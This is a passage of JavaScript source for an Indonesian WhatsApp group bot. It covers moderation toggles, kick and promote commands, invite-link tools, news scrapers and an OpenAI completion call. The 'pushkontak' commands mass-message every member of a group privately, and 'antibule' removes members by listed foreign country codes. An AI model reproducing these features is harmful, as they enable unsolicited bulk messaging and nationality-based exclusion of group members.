if (antiWame) return m.reply('Telah diaktifkan')
ntwame.push(from)
fs.writeFileSync('./HinataBase/database/antiwame.json', JSON.stringify(ntwame, null, 2))
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nFitur anti link wa.me telah di aktifkan.\nSiapapun yang mengirim link wa.me di sini akan otomatis di hapus!⛔`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return m.reply('Sudah dinonaktifkan')
let off = ntwame.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antiwame.json', JSON.stringify(ntwame, null, 2))
m.reply('Sukses mematikan anti link wa.me di grup ini')
} else {
await reply(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================//
case 'antilinkgc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (Antilinkgc) return m.reply('Telah diaktifkan ✅')
ntlinkgc.push(from)
fs.writeFileSync('./HinataBase/database/antilinkgc.json', JSON.stringify(ntlinkgc, null, 2))
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nFitur anti link GC telah di aktifkan.\nSiapapun yang mengirim link GC di sini akan otomatis di hapus!⛔`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return m.reply('Sudah dinonaktifkan ❌')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antilinkgc.json', JSON.stringify(ntlinkgc, null, 2))
m.reply('Sukses mematikan anti link grup di sini ❌')
} else {
await reply(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================//
case 'hapuspromo': case 'antipromo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (HpsPromo) return m.reply('Telah diaktifkan ✅')
hpspromo.push(from)
fs.writeFileSync('./HinataBase/database/hapuspromo.json', JSON.stringify(hpspromo, null, 2))
m.reply('Sukses menyalakan otomatis hapus promosi di grup ini ✅')
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nTidak ada yang boleh melakukan *PROMOSI* di grup ini, siapa pun yang melakukan *PROMOSI* akan otomatis di hapus!⛔`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!HpsPromo) return m.reply('Sudah dinonaktifkan ❌')
let off = hpspromo.indexOf(from)
hpspromo.splice(off, 1)
fs.writeFileSync('./HinataBase/database/hapuspromo.json', JSON.stringify(hpspromo, null, 2))
m.reply('Sukses mematikan otomatis hapus promosi di grup ini ❌')
} else {
await reply(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================//
case 'antivirus': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (antiVirtex) return m.reply('Telah diaktifkan ✅')
ntvirtex.push(from)
fs.writeFileSync('./HinataBase/database/antivirus.json', JSON.stringify(ntvirtex, null, 2))
m.reply('Sukses menyalakan antivirus di grup ini')
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus / bug di grup ini!\n\nYang masih saja mengirim Bug di grup ini akan otomatis di kick`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return m.reply('Sudah dinonaktifkan')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antivirus.json', JSON.stringify(ntvirtex, null, 2))
m.reply('Anti virus dimatikan ❌')
} else {
await reply(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================//
case 'antibule': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "on") {
if (AntiBule) return m.reply('Telah diaktifkan ✅')
ntibule.push(from)
fs.writeFileSync('./HinataBase/database/antibule.json', JSON.stringify(ntibule, null, 2))
m.reply('Sukses menyalakan anti bule di grup ini')
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.sendMessage(from, {text: `\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\nNomor luar negeri di larang di grup ini!\nDan akan otomatis di keluarkan⛔\n\nBerikut daftar nomor yang di larang :\n+212\n+265\n+234\n+258\n+263\n+967\n+20\n+92\n+91\n+55`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiBule) return m.reply('Sudah dinonaktifkan')
let off = ntibule.indexOf(from)
ntibule.splice(off, 1)
fs.writeFileSync('./HinataBase/database/antibule.json', JSON.stringify(ntibule, null, 2))
m.reply('Anti bule dimatikan ❌')
} else {
await reply(`Silakan Ketik Opsi\n\n*Contoh :* ${prefix + command} on\n*Contoh :* ${prefix + command} off\n\non untuk mengaktifkan\noff untuk menonaktifkan`)
}
}break
//=================================================//
case 'pushkontak': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📄Fitur ini di gunakan untuk mengirim pesan ke anggota yang berada di dalam grup melalui bot\n\n📌Contoh : ${prefix + command} Text`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
m.reply(`🚩 *Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik* ⏳`)
for (let geek of mem) {
await sleep(10000)
hinata.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
m.reply(`🚩 *Sukses mengirim pesan Ke ${mem.length} orang* *_✓_*`)
}break
//=================================================
case 'pushkontakid': case 'pushid': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (m.isGroup) return hinatareplypribadi()
if (!isPrem) return hinatareplyprem()
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`📝Fitur ini di gunakan untuk mengirim pesan ke anggota grup melalui bot\n\n📌Contoh: ${prefix + command} Id Grup|Pesan text`)
let metaDATA = await hinata.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
m.reply(`🚩 *_Sedang Push ID..._*\n\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_* ⏳`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
hinata.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
m.reply(`🚩 *_Semua pesan telah dikirim!:_* *_✓_*\n\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 10000);
}
}break;
//=================================================
case 'bcgc': case 'bcgroup': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!text) return reply(`📄Text Nya Mana?\n\n📌Contoh : ${prefix + command} Hinata`)
let getGroups = await hinata.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
hinata.sendMessage(i, {text: `${text}`}, {quoted:m})
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}break
//=================================================
case 'openai': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
try {
if (global.keyopenai === '') return reply("📄Sepertinya ApiKey OpenAi Belum Di Isi\n\n📌Silahkan Isi ApiKey OpenAi Terlebih Dahulu, Apikeynya Di File Config.Js\nApikeynya Bisa Dibuat Melalui Website : https://beta.openai.com/account/api-keys");
if (!text) return m.reply(`📄Chat dengan AI.\n\n📌Contoh:\n${prefix + command} Apa itu coding`)
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: text,
temperature: 0, // Nilai yang lebih tinggi berarti model akan mengambil lebih banyak risiko.
max_tokens: 2048, // Jumlah maksimum token yang dihasilkan dalam penyelesaian. Sebagian besar model memiliki panjang konteks 2048 token (kecuali untuk model terbaru, yang mendukung 4096).
top_p: 1, // alternatif untuk pengambilan sampel dengan suhu, disebut pengambilan sampel nukleus
frequency_penalty: 0.3, // Angka antara -2.0 dan 2.0. Nilai positif menghukum token baru berdasarkan frekuensi yang ada dalam teks sejauh ini, mengurangi kemungkinan model untuk mengulang baris yang sama kata demi kata.
presence_penalty: 0 // Angka antara -2.0 dan 2.0. Nilai positif menghukum token baru berdasarkan apakah mereka muncul dalam teks sejauh ini, meningkatkan kemungkinan model untuk membicarakan topik baru.
});
m.reply(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
m.reply("⚠️Maaf, sepertinya ada yang error :"+ error.message);
}
}
}break
//=================================================//
case 'hidetag': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
hinata.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}break
//=================================================//
case 'kick': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.groupParticipantsUpdate(from, [users], 'remove')
}break
//=================================================//
case 'add': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.groupParticipantsUpdate(from, [users], 'add')
}break
//=================================================//
case 'promote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.groupParticipantsUpdate(from, [users], 'promote')
}break
//=================================================//
case 'demote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.groupParticipantsUpdate(from, [users], 'demote')
}break
//=================================================//
case 'sendlinkgc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (!args[0]) return reply(`📄Fitur Ini Di Gunakan Untuk Mengirim Link Grup Ke Seseorang\n\n📌Contoh ${prefix+command} 6281xxx`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await hinata.groupInviteCode(from)
hinata.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}break
//=================================================
case 'group': case 'grup': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "close"){
await hinata.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === "open"){
await hinata.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
hinata.sendMessage(m.chat, { image: ppnyauser, caption: `📄Silahkan Ketik


${prefix + command} open (Untuk Membuka Grup Secara Publik)
${prefix + command} close (Untuk Menutup Grup Dan Hanya Admin Yang Dapat Mengirim Pesan`}, {quoted:m}) 
}
}break
//=================================================//
case 'editinfo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[0] === "open"){
await hinata.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group\n\nSemua Anggota Dapat Merubah Info Grup`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === "close"){
await hinata.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group\n\nSemua Anggota Tidak Dapat Merubah Info Grup`)).catch((err) => m.reply(jsonformat(err)))
} else {
hinata.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik


${prefix + command} open
${prefix + command} close`}, {quoted:m}) 
}
}break
//=================================================//
case 'tutupgrup': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[1] === "detik") {
var timer = args[0] * `1000`
} else if (args[1] === "menit") {
var timer = args[0] * `60000`
} else if (args[1] === "jam") {
var timer = args[0] * `3600000`
} else if (args[1] === "hari") {
var timer = args[0] * `86400000`
} else {
return reply(`🚩 *Silahkan pilih opsi di bawah ini:*\ndetik\nmenit\njam\nhari\n\n📌 *Contoh :*\n${prefix+command} 10 detik`)
}
m.reply(`\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\n🚩 Grup ${groupMetadata.subject} akan di tutup dalam waktu ${q}\n\n🚩 Yang berarti semua anggota tidak akan bisa menulis pesan di grup ini`)
setTimeout(() => {
var nomor = m.participant
const close = `🚨 Grup telah di tutup\n\n🚩 Sekarang Hanya Admin Yang Dapat Mengirim Pesan`
hinata.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
}break
//=================================================//
case 'bukagrup': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (args[1] === "detik") {
var timer = args[0] * `1000`
} else if (args[1] === "menit") {
var timer = args[0] * `60000`
} else if (args[1] === "jam") {
var timer = args[0] * `3600000`
} else if (args[1] === "hari") {
var timer = args[0] * `86400000`
} else {
return reply(`🚩 *Silahkan pilih opsi di bawah ini:*\ndetik\nmenit\njam\nhari\n\n📌 *Contoh :*\n${prefix+command} 10 detik`)
}
m.reply(`\`\`\`「 ⚠️Peringatan⚠️ 」\`\`\`\n\n🚩 Grup ${groupMetadata.subject} akan di buka dalam waktu ${q}\n\n🚩 Yang berarti semua anggota bisa menulis pesan kembali di grup ini`)
setTimeout(() => {
var nomor = m.participant
const close = `🚨 Grup telah di buka\n\n🚩 Semua anggota Dapat Mengirim Pesan`
hinata.groupSettingUpdate(from, 'not_announcement')
m.reply(close)
}, timer)
}break
//=================================================//
case 'join': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!text) return reply(`📌 *Contoh* : ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await hinata.groupAcceptInvite(result)
await m.reply(`Done`)
}break
//=================================================//
case 'leave': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
try {
if (!text) return reply(`📌 *Contoh* : ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await hinata.groupLeave(result)
await m.reply(`Done`)
} catch (e) {
console.log(e)
m.reply(`[!] Tunggu, Sedang mencoba kembali.`)
await hinata.groupLeave(m.chat)
await m.reply(`Done`)
}
}break
//=================================================//
case 'editsubjek': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!text) return m.reply('Text nya ?')
await hinata.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}break
//=================================================//
case 'editdesk':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!text) return m.reply('Text Nya ?')
await hinata.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}break
//=================================================//
case 'tagall': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
let teks = `══✪〘 *👥 Tag All* 〙✪══
➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
hinata.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}break
//=================================================//
case 'inspect': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
hinata.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」

*▸ Nama Group :* ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

*▸ Deskripsi Di Ubah :* ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
*▸ Pembuat Group :* ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
*▸ Group Di Buat :* ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
*▸ Total Member :* ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

*▸ ID Group  :* ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ~_*${botname}*_~`
try {
pp = await hinata.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
hinata.sendFile(from, pp, "", m, { caption: tekse, mentions: await hinata.parseMention(tekse) })

})
}break
//=================================================//
case 'linkgroup': case 'linkgc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
let response = await hinata.groupInviteCode(from)
hinata.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}break
//=================================================//
case 'resetlinkgc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
hinata.groupRevokeInvite(from)
}break
//=================================================//
case 'demoteall': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.groupParticipantsUpdate(from, mems, 'demote')
}break
//=================================================//
case 'promoteall': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
var groupe = await hinata.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
hinata.groupParticipantsUpdate(from, mems, 'promote')
}break
//=================================================//
case 'fajar': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
}break
//=================================================//
case 'cnn': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
}break
//=================================================//
case 'layarkaca': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return m.reply('Masukan judul film nya') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
}break
//=================================================//
case 'cnbc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'tribun': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'indozone': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'kompas': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'detik': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'daily': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'inews': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
}break
//=================================================//
case 'okezone': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'sindo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
}break
//=================================================//
case 'tempo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'antara': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'kontan-news': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
hinata.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
}break
//=================================================//
case 'merdeka-news': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
